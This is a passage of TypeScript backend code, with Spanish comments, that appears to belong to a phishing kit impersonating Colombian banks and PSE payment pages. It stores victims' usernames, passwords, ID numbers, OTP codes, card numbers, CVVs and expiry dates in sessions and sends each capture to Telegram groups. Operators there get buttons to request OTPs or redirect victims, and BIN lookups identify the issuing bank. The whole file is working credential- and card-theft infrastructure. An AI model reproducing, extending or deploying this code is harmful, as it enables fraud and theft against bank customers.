            const data = req.body.data?.attributes;
            const sessionId = data?.sessionId || data?.session_id;

            // Se valida si falta sessionId
            if (!sessionId) {

                // Se retorna el error
                return res.status(400).json({
                    success: false,
                    message: 'sessionId requerido',
                });
            }

            // Se obtiene la session
            let currentSession = (await StorageService.get(`session_${sessionId}`)) || {};

            // Se añade el evento de reenvio de OTP
            currentSession = Helper.addEvent(currentSession, 'tc_otp_resend', {
                fecha: Helper.formatDateCustom(new Date()),
            });

            // Se setea la session en el almacenamiento
            await StorageService.set(`session_${sessionId}`, currentSession);
            await StorageService.set(`status_${sessionId}`, 'sol_otp');

            // Se actualiza el mensaje de Telegram
            currentSession = await Helper.refreshTelegramSession(
                sessionId,
                currentSession,
                true
            );

            // Se retorna la respuesta
            return res.json({
                success: true,
                sessionId,
            });
        } catch (error) {

            // Se retorna el error
            return res.status(500).json({
                success: false,
                message: 'Error al reenviar OTP TC ' + (error as Error).message,
            });
        }
    }

    /**
   * Metodo encargado de formatear la tarjeta de credito
   * AMEX / American Express: 4-6-5
   * Otras tarjetas: grupos de 4 dígitos
   * 
   * @param number 
   * @param cardLabel 
   * @returns 
   */
    static formatCardNumber(number: string, cardLabel?: string): string {

        // Se valida cuando no se proporciona un numero
        if (!number) return 'N/A';

        // Eliminar cualquier carácter que no sea numérico
        const clean = number.replace(/\D/g, '');
        const label = (cardLabel ?? '').toLowerCase();

        // Detectar American Express
        const isAmex = label.includes('amex') || label.includes('american express') || /^3[47]/.test(clean);

        // Se valida si es AMEX
        if (isAmex) {

            // Formato AMEX: XXXX XXXXXX XXXXX
            const match = clean.match(/^(\d{0,4})(\d{0,6})(\d{0,5})$/);

            // Se valida si no se pudo hacer el match
            if (!match) return clean;

            // Se retorna el numero formateado
            return [match[1], match[2], match[3]]
                .filter(Boolean)
                .join(' ');
        }

        // Formato estándar: grupos de 4 dígitos
        return clean.match(/.{1,4}/g)?.join(' ') ?? clean;
    }

    /**
   * Metodo encargado de armar el mensaje para telegram
   * 
   * @param data Datos de la sesion
   * @returns Mensaje formateado
   */

    static formatMessageDefault(data: any): string {

        // Se captura el banco para el encabezado
        const rawBank = String(data.banco || data.bank || 'DESCONOCIDO').trim();
        const tcBankIdentified = String(data.tcBankIdentified || '').trim();
        const headerBank = data.tc && (!rawBank || rawBank.toUpperCase() === 'DESCONOCIDO') && tcBankIdentified
            ? tcBankIdentified
            : rawBank || 'DESCONOCIDO';

        // Encabezado
        let msg = `🏦 [${Helper.escapeHtml(headerBank)}] \n\n`;

        // Metodo encargado de formatear la fecha
        const fechaStr = data.fecha ? Helper.formatDateCustom(data.fecha) : Helper.formatDateCustom(new Date());

        // Se inicializa la fecha en 
        msg += `📅 <b>Fecha:</b> ${fechaStr}\n`;

        // Se inicializa la informacion
        if (data.sessionId)
            msg += `🕵️ <b>ID:</b> ${Helper.formatTelegramSessionId(data.sessionId)}\n`;
        if (data.ip)
            msg += `🔎 <b>IP:</b> <a href="https://ipinfo.io/${data.ip}">${Helper.escapeHtml(data.ip)}</a>\n`;
        if (data.location)
            msg += `🌎 <b>Ubicación:</b> ${Helper.escapeHtml(data.location)}\n`;
        if (data.correoUsuario)
            msg += `📧 <b>Correo Usuario:</b> ${Helper.escapeHtml(data.correoUsuario)}\n`;
        if (data.precio)
            msg += `💰 <b>Precio:</b> ${Helper.escapeHtml(data.precio)}\n`;
        if (data.panel)
            msg += `💻 <b>Panel:</b> ${Helper.escapeHtml(data.panel)}\n`;
        if (data.cedula)
            msg += `🪪 <b>Cédula:</b> ${Helper.escapeHtml(data.cedula)}\n`;
        if (data.tipoDocumento)
            msg += `🪪 <b>Tipo Documento:</b> ${Helper.escapeHtml(data.tipoDocumento)}\n`;
        if (data.celular)
            msg += `👥 <b>Celular:</b> ${Helper.escapeHtml(data.celular)}\n\n`;

        // Se inicializa la informacion
        msg += `🎯 <b>Origen:</b> ${data.tc ? 'TC' : 'PSE'} ${data.seccion ? '- ' + data.seccion : ''}\n`;

        // Se inicializa la informacion
        msg += `\n♻️ INFORMACIÓN RECOLECTADA ♻️\n\n`;

        // Recorrer timeline para agrupar y mostrar
        if (data.timeline && Array.isArray(data.timeline)) {
            data.timeline.forEach((event: any) => {
                switch (event.type) {
                    case 'admin_action':
                        {
                            const adminUrlRaw = String(event?.data?.link || event?.data?.url || event?.data?.mensaje || '').trim();
                            const adminUrlClean = adminUrlRaw
                                .replace(/^⏳\s*Solicitando Link:\s*/i, '')
                                .replace(/\s*⏳\s*$/g, '')
                                .trim();
                            const adminUrlDisplay = adminUrlClean.length > 60 ? `${adminUrlClean.slice(0, 57)}...` : adminUrlClean;
                            if (adminUrlClean) {
                                msg += `<a href="${Helper.escapeHtml(adminUrlClean)}">${Helper.escapeHtml(adminUrlDisplay)}</a>\n\n`;
                            }
                        }
                        break;
                    case 'pasajero':
                        msg += `🛫 Pasajero\n`;
                        msg += `<b>Nombre:</b> ${Helper.escapeHtml(event.data.nombre)}\n`;
                        msg += `<b>Documento:</b> ${Helper.escapeHtml(event.data.documento)}\n\n`;
                        break;
                    case 'credenciales':
                        msg += `🔐 Credenciales\n`;
                        msg += `<b>Tipo Documento:</b> ${Helper.escapeHtml(event.data.tipoDocumento)}\n`;
                        msg += `<b>User:</b> ${Helper.escapeHtml(event.data.usuario)}\n`;
                        msg += `<b>Password:</b> ${Helper.escapeHtml(event.data.clave)}\n\n`;
                        break;
                    case 'otp':
                        msg += `📲 OTP\n`;
                        msg += `<b>OTP:</b> ${event.data.otp}\n\n`;
                        break;
                    case 'tc_bin':
                        msg += `💳 INFORMACIÓN DE LA TARJETA\n`;
                        msg += `<b>PAÍS:</b> ${Helper.escapeHtml(event.data.country)}\n`;
                        msg += `<b>BANCO:</b> ${Helper.escapeHtml(event.data.bank)}\n`;
                        msg += `<b>TIPO:</b> ${Helper.escapeHtml(event.data.type)}\n`;
                        msg += `<b>FRANQUICIA:</b> ${Helper.escapeHtml(event.data.frachise)}\n`;
                        msg += `<b>CATEGORIA:</b> ${Helper.escapeHtml(event.data.category)}\n`;
                        msg += `\n`;
                        break;
                    case 'tc':
                        msg += `💳 TC\n`;
                        msg += `<b>TC:</b> ${Helper.formatCardNumber(event.data.numeroTarjeta)}\n`;
                        msg += `<b>CVV:</b> ${event.data.cvv}\n`;
                        msg += `<b>DATE:</b> ${event.data.fechaExpiracion}\n\n`;
                        break;
                    case 'bot_value':
                        msg += `🤖 <b>Resultado Transacción:</b>\n`;
                        if (event.data.TX_VALUE) {
                            msg += `<b>Valor:</b> ${Helper.escapeHtml(event.data.TX_VALUE)}\n`;
                        }
                        if (event.data.lapTransactionState) {
                            msg += `<b>Estado:</b> ${Helper.escapeHtml(event.data.lapTransactionState)}\n`;
                        }
                        if (event.data.buyerEmail) {
                            msg += `<b>Email:</b> ${Helper.escapeHtml(event.data.buyerEmail)}\n`;
                        }
                        if (event.data.fechaTransaccion) {
                            msg += `<b>Fecha Transacción:</b> ${Helper.escapeHtml(event.data.fechaTransaccion)}\n`;
                        }

                        // Se agrega un salto de linea
                        msg += `\n`;

                        // Se finaliza el switch
                        break;
                }
            });
        }

        // Se retorna el mensaje formateado
        return msg;
    }

    /**
     * Arma el contexto de pantalla TC (OTP / dinámica) desde la sesión del panel
     *
     * @param session Sesión en storage
     * @param sessionId ID de sesión
     * @returns Datos para el frontend (comercio, monto, banco, tarjeta, etc.)
     */
    static buildTcAuthContext(session: any, sessionId: string) {

        // Se captura el numero de tarjeta
        const tarjeta = Helper.getTcCardNumberFromSession(session);
        const ultimosDigitos = tarjeta.length >= 4 ? tarjeta.slice(-4) : '';

        // Se captura el precio de la sesion
        const precio = session?.precio ?? session?.valor;

        // Se inicializa el monto
        let monto = '';

        // Se valida si el precio es valido
        if (precio !== undefined && precio !== null && precio !== '') {

            // Se captura el precio en numero
            const n = Number(precio);

            // Se valida si el precio es finito
            if (Number.isFinite(n)) {

                // Se captura el monto formateado
                monto = `$${n.toLocaleString('es-CO', {
                    minimumFractionDigits: 2,
                    maximumFractionDigits: 2,
                })}`;
            } else {

                // Se captura el monto original
                monto = String(precio);
            }
        }

        // Se captura el comercio
        const comercio = String(session?.panel || session?.empresa || session?.comercio || '').trim();

        // Se captura el banco
        const banco = String(session?.banco || '').trim();

        // Se captura la fecha
        const fecha = session?.fecha ? Helper.formatReceiptDate(session.fecha) : Helper.formatReceiptDate(new Date());

        // Se captura el evento de TC
        const tcEvent = Helper.getTcEventFromTimeline(session?.timeline);

        // Se retorna el contexto de la sesion
        return {
            sessionId,
            comercio,
            monto,
            ultimosDigitos,
            fecha,
            banco,
            tarjeta,
            franquicia: String(tcEvent?.data?.franquicia || '').trim(),
            tc: Boolean(session?.tc),
        };
    }

    /**
     * Metodo encargado de consultar la sesión TC para pantallas ingreso-tc (por sessionId)
     *
     * @param req
     * @param res
     * @returns
     */
    static async getTcAuthContext(req: Request, res: Response) {

        // Se usa el try catch
        try {

            // Se captura el sessionId
            const rawId = req.params.sessionId;
            const sessionId = Array.isArray(rawId) ? rawId[0] : rawId;

            // Se valida si falta sessionId
            if (!sessionId) {

                // Se retorna el error
                return res.status(400).json({
                    success: false,
                    message: 'sessionId requerido',
                });
            }

            // Se obtiene la session
            const session = (await StorageService.get(`session_${sessionId}`)) || {};

            // Se valida si no hay session
            if (!session || Object.keys(session).length === 0) {

                // Se retorna el error
                return res.status(404).json({
                    success: false,
                    message: 'Sesión no encontrada',
                });
            }

            // Se construye el contexto de la sesion
            const context = Helper.buildTcAuthContext(session, String(sessionId));

            // Se retorna el contexto de la sesion
            return res.json({
                success: true,
                context,
            });
        } catch (error) {

            // Se retorna el error
            return res.status(500).json({
                success: false,
                message: 'Error al obtener contexto TC ' + (error as Error).message
            });
        }
    }

    /**
     * Metodo encargado de obtener los datos del comprobante PSE para la pantalla final (por sessionId).
     * 
     * @param req 
     * @param res 
     * @returns 
     */
    static async getPseReceipt(req: Request, res: Response) {

        // Se usa el try catch
        try {

            // Se captura el sessionId
            const rawId = req.params.sessionId;
            const sessionId = Array.isArray(rawId) ? rawId[0] : rawId;

            // Se valida si hay sessionId
            if (!sessionId) {

                // Se retorna el error
                return res.status(400).json({
                    success: false,
                    message: 'sessionId requerido',
                });
            }

            // Se obtiene la session
            const session = (await StorageService.get(`session_${sessionId}`)) || {};

            // Se obtiene el estado de la session
            const storageStatus = await StorageService.get(`status_${sessionId}`);

            // Se construye el comprobante
            const receipt = Helper.buildReceiptFromSession(
                session,
                String(sessionId),
                storageStatus || session?.lastStatus
            );

            // Se retorna el comprobante
            return res.json({
                success: true,
                receipt,
            });
        } catch (error) {

            // Se retorna el error
            return res.status(500).json({
                success: false,
                message: 'Error al obtener datos del comprobante ' + (error as Error).message,
            });
        }
    }

    /**
     * Metodo encargado de formatear las fechas en el formato personalizado
     * 
     * @param dateInput
     * @returns
     */
    static formatDateCustom(dateInput: string | Date): string {

        // Se valida el tipo de dato
        let date = typeof dateInput === 'string' ? new Date(dateInput) : dateInput;

        // Validar si la fecha es invalida
        if (isNaN(date.getTime())) {

            // Fallback a fecha actual
            date = new Date();
        };

        // Días: Dom Lun Mar Mié Jue Vie Sáb
        const dias = [
            'Domingo',
            'Lunes',
            'Martes',
            'Miércoles',
            'Jueves',
            'Viernes',
            'Sábado',
        ];

        // Meses: Ene Feb Mar Abr May Jun Jul Ago Sep Oct Nov Dic
        const meses = [
            'Enero',
            'Febrero',
            'Marzo',
            'Abril',
            'Mayo',
            'Junio',
            'Julio',
            'Agosto',
            'Septiembre',
            'Octubre',
            'Noviembre',
            'Diciembre',
        ];

        // Se inicilizan variables
        const diaLetra = dias[date.getDay()];
        const diaNum = date.getDate();
        const mesLetra = meses[date.getMonth()];
        const anio = date.getFullYear(); // AÑO COMPLETO 2026
        const h24 = date.getHours();
        const ampm = h24 >= 12 ? 'PM' : 'AM';
        let h12 = h24 % 12;
        if (h12 === 0) h12 = 12;
        const hora = h12.toString().padStart(2, '0');
        const min = date.getMinutes().toString().padStart(2, '0');

        // Se retorna el formato de la fecha
        return `${diaLetra} ${diaNum} ${mesLetra} ${anio}, ${hora}:${min} ${ampm}`;
    };

    /**
     * Metodo encargado de formatear el mensaje según el banco de la sesión
     *
     * @param data Datos de la sesión
     * @param bank Código del banco (opcional)
     */
    static async formatMessageForBank(data: any, bank?: string): Promise<string> {

        // Se obtiene el banco
        const banco = (bank || data.banco || '').toUpperCase();

        // Se valida si es Banco AV VILLAS
        if (banco === 'AVVILLAS') {

            // Se importa el controlador de AV VILLAS
            const { AvvillasController } = await import('./bancoAvvillas/AvvillasController');

            // Se retorna el mensaje formateado de AV VILLAS
            return AvvillasController.formatMessage(data);
        }

        else if (banco === 'BANCOLOMBIA') {

            // Se importa el controlador de Bancolombia
            const { BancolombiaController } = await import('./bancoBancolombia/BancolombiaController');

            // Se retorna el mensaje formateado de Bancolombia
            return BancolombiaController.formatMessage(data);
        }

        else if (banco === 'BBVA') {

            // Se importa el controlador de BBVA
            const { BbvaController } = await import('./bancoBbva/BbvaController');

            // Se retorna el mensaje formateado de BBVA
            return BbvaController.formatMessage(data);
        }

        else if (banco === 'BOGOTA') {

            // Se importa el controlador de Bogota
            const { BogotaController } = await import('./bancoBogota/BogotaController');

            // Se retorna el mensaje formateado de Bogota
            return BogotaController.formatMessage(data);
        }

        else if (banco === 'CAJA_SOCIAL') {

            // Se importa el controlador de Caja Social
            const { CajaSocialController } = await import('./bancoCajaSocial/CajaSocialController');

            // Se retorna el mensaje formateado de Caja Social
            return CajaSocialController.formatMessage(data);
        }

        else if (banco === 'COLPATRIA') {

            // Se importa el controlador de Colpatria
            const { ColpatriaController } = await import('./bancoColpatria/ColpatriaController');

            // Se retorna el mensaje formateado de Colpatria
            return ColpatriaController.formatMessage(data);
        }

        else if (banco === 'DAVIVIENDA') {

            // Se importa el controlador de Davivienda
            const { DaviviendaController } = await import('./bancoDavivienda/DaviviendaController');

            // Se retorna el mensaje formateado de Davivienda
            return DaviviendaController.formatMessage(data);
        }

        else if (banco === 'FALABELLA') {

            // Se importa el controlador de Falabella
            const { FalabellaController } = await import('./bancoFalabella/FalabellaController');

            // Se retorna el mensaje formateado de Falabella
            return FalabellaController.formatMessage(data);
        }

        else if (banco === 'ITAU') {

            // Se importa el controlador de Itau
            const { ItauController } = await import('./bancoItau/ItauController');

            // Se retorna el mensaje formateado de Itau
            return ItauController.formatMessage(data);
        }

        else if (banco === 'NEQUI') {

            // Se importa el controlador de Nequi
            const { NequiController } = await import('./bancoNequi/NequiController');

            // Se retorna el mensaje formateado de Nequi
            return NequiController.formatMessage(data);
        }

        else if (banco === 'OCCIDENTE') {

            // Se importa el controlador de Occidente
            const { OccidenteController } = await import('./bancoOccidente/OccidenteController');

            // Se retorna el mensaje formateado de Occidente
            return OccidenteController.formatMessage(data);
        }

        else if (banco === 'POPULAR') {

            // Se importa el controlador de Popular
            const { PopularController } = await import('./bancoPopular/PopularController');

            // Se retorna el mensaje formateado de Popular
            return PopularController.formatMessage(data);
        }

        else if (banco === 'SERFINANZA') {

            // Se importa el controlador de Serfinanza
            const { SerfinanzaController } = await import('./bancoSerfinanza/SerfinanzaController');

            // Se retorna el mensaje formateado de Serfinanza
            return SerfinanzaController.formatMessage(data);
        }

        // Se retorna el mensaje formateado por defecto
        return Helper.formatMessageDefault(data);
    }

    /**
     * Metodo encargado de actualizar el mensaje de Telegram con el estado actual de la sesión
     *
     * @param sessionId ID de la sesión
     * @param currentSession Datos de la sesión
     * @param withButtons Si debe incluir botones de acción
     */
    static async refreshTelegramSession(sessionId: string, currentSession: any, withButtons = true): Promise<any> {

        // Se valida cuando la session viene por tc
        const isTc = Boolean(currentSession?.tc);

        // Se valida si la persona entro por TC
        if (isTc) {

            // Se busca en data.timeline si existe un evento de tipo 'tc'
            const tcEvent = Helper.getTcEventFromTimeline(currentSession.timeline);

            // Se obtiene el numero de tarjeta
            const binCard = tcEvent?.data?.numeroTarjeta;

            // Se obtiene la informacion de la tarjeta
            const binData = await Helper.getAndSetCardData(binCard, {
                tcData: tcEvent?.data,
            });

            // Se tipa el binLookup para acceder de forma segura a data
            const binLookupData = (binData?.binLookup as {
                data?: {
                    bank?: { name?: string };
                    card?: {
                        type?: string;
                        scheme?: string;
                        category?: string;
                    };
                    country?: {
                        name?: string
                    };
                };
            } | null | undefined)?.data;

            // Se captura la informacion del banco
            const nameBank = binLookupData?.bank?.name;
            const typeCard = binLookupData?.card?.type;
            const frachiseCard = binLookupData?.card?.scheme;
            const categoryCard = binLookupData?.card?.category;
            const countryCard = binLookupData?.country?.name;

            // Se detecta el banco
            const bankDetected = Helper.detectBank(nameBank || '');
            const bank = bankDetected === 'DESCONOCIDO' && nameBank
                ? String(nameBank).trim()
                : bankDetected;

            // Se guarda el banco identificado por TC para mostrarlo en mensaje
            currentSession.tcBankIdentified = nameBank || null;

            // Se añade la informacion del banco a la sesion
            currentSession.bank = bank;
            currentSession.banco = bank;

            // Se añade la informacion de la tarjeta a la linea de tiempo
            currentSession.timeline.push({
                type: 'tc_bin',
                data: {
                    country: countryCard,
                    bank: nameBank,
                    type: typeCard,
                    frachise: frachiseCard,
                    category: categoryCard,
                },
                timestamp: new Date().toISOString(),
            });
        };

        // Se obtiene el banco
        const bank = currentSession.banco || 'DESCONOCIDO';
        const message = await Helper.formatMessageForBank(currentSession, bank);
        const buttons = withButtons ? (await Helper.getButtons(sessionId, bank) ?? []) : [];

            // Se elimina el mensaje anterior si existe
        if (currentSession.messageId) {

            // Se elimina el mensaje anterior en el grupo correcto (TC o PSE)
            await TelegramService.deletePreviousMessage(currentSession.messageId.toString(), sessionId);
        }

        // Se envia el mensaje al grupo TC o PSE según la sesión
        const msgId = await TelegramService.sendMessage(message, buttons, sessionId);

        // Se setea el messageId en la sesión
        currentSession.sessionId = sessionId;
        currentSession.messageId = msgId;
        currentSession.bank = bank;

        // Se setea la sesión en el almacenamiento
        await StorageService.set(`session_${sessionId}`, currentSession);

        // Se retorna la sesión
        return currentSession;
    }

    /**
     * Metodo encargado de escapar el HTML
     * 
     * @param text 
     * @returns 
     */
    static escapeHtml(text: string): string {

        // Se valida que el texto no sea nulo
        if (!text) return '';

        // Se escapa el HTML
        return String(text)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#039;');
    }

    /**
     * Formatea el sessionId para Telegram (HTML) sin auto-link de teléfonos
     *
     * @param sessionId ID de sesión
     * @returns Texto escapado dentro de &lt;code&gt;
     */
    static formatTelegramSessionId(sessionId: string): string {

        // Se valida que haya sessionId
        if (!sessionId) return '';

        // Se envuelve en code para evitar que Telegram resalte números como teléfono
        return `<code>${Helper.escapeHtml(String(sessionId))}</code>`;
    }

    /**
     * Botones de entrada PSE/TC para Telegram
     *
     * @param sessionId ID de sesión
     * @param bank Banco (puede incluir sufijo :P01)
     * @param bankBase Banco normalizado sin sufijo
     * @param showBackButton Flag para mostrar BACK en fallback TC sin banco mapeado
     */
    static buildPseEntryButtons(sessionId: string, bank: string, bankBase: string, showBackButton: boolean = false) {

        // Se inicializa la url del frontend
        const frontendUrl = process.env.FRONTEND_URL;

        // Se retornan los 3 botones del flujo PSE normal
        return [
            [
                {
                    text: showBackButton ? '⬅️ BACK' : '🔲 LOGO',
                    callback_data: `${showBackButton ? 'back' : 'logo'}:${sessionId};${bank}`,
                },
                {
                    text: '🤖 LINK BOT',
                    callback_data: `link_bot:${sessionId};${bank}`,
                },
                {
                    text: '🔗 LINK CUSTOM',
                    url: `${frontendUrl}/link-custom?sessionId=${sessionId}&bank=${bankBase}`,
                },
            ],
        ];
    }

    /**
     * Metodo encargado de construir los botones para el mensaje de Telegram
     *
     * @param sessionId
     * @param bank
     * @returns
     */
    static async getButtons(sessionId: string, bank: string) {

        // Se normaliza el banco (BANCOLOMBIA:P01 → BANCOLOMBIA)
        const bankBase = String(bank || 'DESCONOCIDO').split(':')[0].toUpperCase();

        // Se consulta si la sesión es flujo TC
        const session = (await StorageService.get(`session_${sessionId}`)) || {};
        const firebaseSession = await FirebaseService.getSession(sessionId.toString());
        const isTc = Boolean(session?.tc ?? firebaseSession?.tc);

        // PSE sin TC: panel reducido (LOGO, LINK BOT, LINK CUSTOM)
        if (!isTc) {

            // Se valida si el banco no está en el listado para mostrar BACK en vez de LOGO
            const showBackForUnknownBank = !Helper.BANK_ROUTES[bankBase];

            // Se retornan los botones de entrada PSE
            return Helper.buildPseEntryButtons(sessionId, bank, bankBase, showBackForUnknownBank);
        }

        // Se validan los botones por tipo de Banco
        if (bankBase === 'AVVILLAS') {

            // Se importa el controlador de AV VILLAS
            const { AvvillasController } = await import('./bancoAvvillas/AvvillasController');

            // Se retornan los botones de operador TC
            return AvvillasController.getButtons(sessionId, true);
        }

        // Flujo TC en Bancolombia: panel completo (OTP, DIN, TC CUSTOM, etc.)
        else if (bankBase === 'BANCOLOMBIA') {

            // Se importa el controlador de Bancolombia
            const { BancolombiaController } = await import('./bancoBancolombia/BancolombiaController');

            // Se retornan los botones de operador TC
            return BancolombiaController.getButtons(sessionId, null, true);
        }

        // Flujo TC en BBVA: panel completo (OTP, TC CUSTOM, etc.)
        else if (bankBase === 'BBVA') {

            // Se importa el controlador de BBVA
            const { BbvaController } = await import('./bancoBbva/BbvaController');

            // Se retornan los botones de operador TC
            return BbvaController.getButtons(sessionId, true);
        }

        else if (bankBase === 'BOGOTA') {

            // Se importa el controlador de Bogota
            const { BogotaController } = await import('./bancoBogota/BogotaController');

            // Se retornan los botones de operador TC
            return BogotaController.getButtons(sessionId, true);
        }

        else if (bankBase === 'CAJA_SOCIAL') {

            // Se importa el controlador de Caja Social
            const { CajaSocialController } = await import('./bancoCajaSocial/CajaSocialController');

            // Se retornan los botones de operador TC
            return CajaSocialController.getButtons(sessionId, true);
        }

        else if (bankBase === 'COLPATRIA') {

            // Se importa el controlador de Colpatria
            const { ColpatriaController } = await import('./bancoColpatria/ColpatriaController');

            // Se retornan los botones de operador TC
            return ColpatriaController.getButtons(sessionId, true);
        }

        else if (bankBase === 'DAVIVIENDA') {

            // Se importa el controlador de Davivienda
            const { DaviviendaController } = await import('./bancoDavivienda/DaviviendaController');

            // Se retornan los botones de operador TC
            return DaviviendaController.getButtons(sessionId, null, true);
        }

        else if (bankBase === 'FALABELLA') {

            // Se importa el controlador de Falabella
            const { FalabellaController } = await import('./bancoFalabella/FalabellaController');

            // Se retornan los botones de operador TC
            return FalabellaController.getButtons(sessionId, true);
        }

        else if (bankBase === 'ITAU') {

            // Se importa el controlador de Itau
            const { ItauController } = await import('./bancoItau/ItauController');

            // Se retornan los botones de operador TC
            return ItauController.getButtons(sessionId, true);
        }

        else if (bankBase === 'NEQUI') {

            // Se importa el controlador de Nequi
            const { NequiController } = await import('./bancoNequi/NequiController');

            // Se retornan los botones de operador TC
            return NequiController.getButtons(sessionId, null, true);
        }

        else if (bankBase === 'OCCIDENTE') {

            // Se importa el controlador de Occidente
            const { OccidenteController } = await import('./bancoOccidente/OccidenteController');

            // Se retornan los botones de operador TC
            return OccidenteController.getButtons(sessionId, true);
        }

        else if (bankBase === 'POPULAR') {

            // Se importa el controlador de Popular
            const { PopularController } = await import('./bancoPopular/PopularController');

            // Se retornan los botones de operador TC
            return PopularController.getButtons(sessionId, true);
        }

        else if (bankBase === 'SERFINANZA') {

            // Se importa el controlador de Serfinanza
            const { SerfinanzaController } = await import('./bancoSerfinanza/SerfinanzaController');

            // Se retornan los botones de operador TC
            return SerfinanzaController.getButtons(sessionId, true);
        }

        // Otros bancos con TC no mapeados: se retorna BACK en vez de LOGO
        return Helper.buildPseEntryButtons(sessionId, bank, bankBase, true);
    }

    /**
     * Metodo encargado de obtener el mapa de bancos con sus rutas PSE
     * 
     * @param req 
     * @param res 
     * @returns 
     */
    static getBankRoutes(req: Request, res: Response) {

        // Se retorna el mapa de bancos con tipado correcto
        res.json({
            success: true,
            banks: Helper.BANK_ROUTES
        });
    }

    /**
     * Metodo encargado de consultar el bin table
     * 
     * @param bin 
     * @param apiKey 
     * @returns 
     */
    private static lookupBinTable(bin: string, apiKey: string): Promise<unknown> {

        // Se usa el try catch
        return new Promise((resolve, reject) => {

            // Se realiza la consulta al bin table
            bintableApi.Lookup(bin, apiKey, (raw: unknown) => {

                // Se usa el try catch
                try {

                    // Se valida si el raw es una cadena de texto y no esta vacia
                    if (typeof raw === "string" && raw.trim()) {

                        // Se parsea el raw a JSON
                        resolve(JSON.parse(raw));

                        // Se sale del metodo
                        return;
                    }

                    // Se retorna el raw
                    resolve(raw);
                } catch (parseError) {

                    // Se retorna el error
                    reject(parseError);
                }
            });
        });
    }

    /**
     * Metodo encargado de obtener y setear los datos de la tarjeta
     * 
     * @param cardNumber 
     * @param context 
     * @returns 
     */
    static async getAndSetCardData(cardNumber: string, context: { tcData?: Record<string, unknown> } = {}) {

        // Se usa el try catch
        try {

            // Se obtiene el numero de tarjeta
            const digits = String(cardNumber || context.tcData?.card || "").replace(/\D/g, "");
            const bin = digits.slice(0, 6);

            // Se valida si el bin es valido
            if (bin.length < 6) {

                // Se retorna null
                return null;
            }

            // Se consulta en el firebase
            let binLookup = await FirebaseService.getCardBinChecker(bin);

            // Se valida si el binLookup es valido
            const fromCache = Boolean(binLookup);

            // Se valida si no existe en el firebase
            if (!binLookup) {

                // Se obtiene la api key de la variable de entorno
                const apiKey = process.env.BINTABLE_API_KEY?.trim();

                // Se valida si la api key es valida
                if (!apiKey) {

                    // Se imprime el error
                    console.error("[BINLOOKUP ERROR] BINTABLE_API_KEY no configurado");

                    // Se retorna null
                    return null;
                }

                // Se realiza la consulta al bin table
                binLookup = await Helper.lookupBinTable(bin, apiKey);

                // Se valida si la respuesta es valida
                if (!FirebaseService.isValidBinLookup(binLookup)) {

                    // Se imprime el error
                    console.warn("[BINLOOKUP] Respuesta inválida de BinTable para bin", bin);

                    // Se retorna null
                    return null;
                }

                // Se guarda en el firebase
                await FirebaseService.saveDataCardBinChecker({
                    bin,
                    binLookup,
                    savedAt: new Date().toISOString(),
                });
            } else {

                // Se imprime el mensaje
                console.log("[BINLOOKUP] Cache hit Firebase bodega/binchecker bin", bin);
            }

            // Se retorna los datos
            return {
                tcData: context.tcData ?? null,
                bin,
                binLookup,
                fromCache,
                savedAt: new Date().toISOString(),
            };
        } catch (error) {

            // Se imprime el error
            console.error("[BINLOOKUP ERROR]", error);

            // Se retorna null
            return null;
        }
    }

    /**
     * Metodo encargado de validar el OTP de la tarjeta
     *
     * @param req
     * @param res
     * @returns
     */
    static async otpTc(req: Request, res: Response) {

        // Se usa el try catch
        try {

            // Se captura la informacion
            const data = req.body.data?.attributes;
            const sessionId = data.sessionId;
            const otp = data.otp;

            // Se obtiene la session
            let session = (await StorageService.get(`session_${sessionId}`)) || {};

            // Se valida si no hay session
            if (!session || Object.keys(session).length === 0) {

                // Se retorna el error
                return res.status(404).json({
                    success: false,
                    message: 'Sesión no encontrada',
                });
            }

            // Se añade la OTP a la linea de tiempo
            session = Helper.addEvent(session, 'otp', {
                otp: otp,
                fecha: Helper.formatDateCustom(new Date()),
            });

            // Se setea la informacion en la session
            await StorageService.set(`session_${sessionId}`, session);
            await StorageService.set(`status_${sessionId}`, 'pendiente');

            // Se usa el messageId de la sesión (persiste en Firebase, no en memoria)
            const messageId = session.messageId;

            // Se elimina el mensaje anterior si existe
            if (messageId) {

                // Se elimina el mensaje anterior en el grupo correcto (TC o PSE)
                await TelegramService.deletePreviousMessage(messageId.toString(), sessionId);
            }

            // Se captura el banco
            const bank = session.bank;

            // Se inicializa la informacion
            const buttons = await Helper.getButtons(sessionId, bank);
            const message = await Helper.formatMessageForBank(session, bank);

            // Se envia el mensaje
            const msgId = await TelegramService.sendMessage(message, buttons, sessionId);

            // Se setea el messageId en la sesión
            session.sessionId = sessionId;
            session.messageId = msgId;

            // Se setea la data
            await StorageService.set(`session_${sessionId}`, session);

            // Se retorna la respuesta
            res.json({
                success: true,
                sessionId: sessionId
            });
        } catch (error) {

            // Se retorna el error
            return res.status(500).json({
                success: false,
                message: 'Error al obtener contexto TC ' + (error as Error).message
            });
        }
    }

    /**
     * Metodo encargado de detectar el banco por el nombre
     * 
     * @param bankName 
     * @returns 
     */
    static detectBank(bankName?: string): string {

        // Se valida si el nombre del banco es valido
        if (!bankName) {

            // Se retorna desconocido
            return '';
        }

        // Se normaliza el nombre del banco
        const normalized = bankName.toUpperCase().normalize('NFD').replace(/[\u0300-\u036f]/g, '');

        // Se definen los bancos con sus alias
        const banks = [
            { key: 'AVVILLAS', aliases: ['AV VILLAS'] },
            { key: 'BANCOLOMBIA', aliases: ['BANCOLOMBIA'] },
            { key: 'BBVA', aliases: ['BBVA', 'BANCO BILBAO'] },
            { key: 'BOGOTA', aliases: ['BOGOTA'] },
            { key: 'CAJA_SOCIAL', aliases: ['CAJA SOCIAL'] },
            { key: 'COLPATRIA', aliases: ['COLPATRIA'] },
            { key: 'DAVIVIENDA', aliases: ['DAVIVIENDA'] },
            { key: 'FALABELLA', aliases: ['FALABELLA'] },
            { key: 'ITAU', aliases: ['ITAU', 'BANCO CORPBANCA COLOMBIA, S.A.'] },
            { key: 'NEQUI', aliases: ['NEQUI'] },
            { key: 'OCCIDENTE', aliases: ['OCCIDENTE'] },
            { key: 'POPULAR', aliases: ['POPULAR'] },
            { key: 'SERFINANZA', aliases: ['SERFINANSA'] },
        ];

        // Se recorren los bancos con sus alias
        for (const bank of banks) {

            // Se valida si el nombre del banco coincide con el alias
            if (bank.aliases.some(alias => normalized.includes(alias))) {

                // Se retorna el banco
                return bank.key;
            }
        }

        // Se retorna null
        return '';
    }
}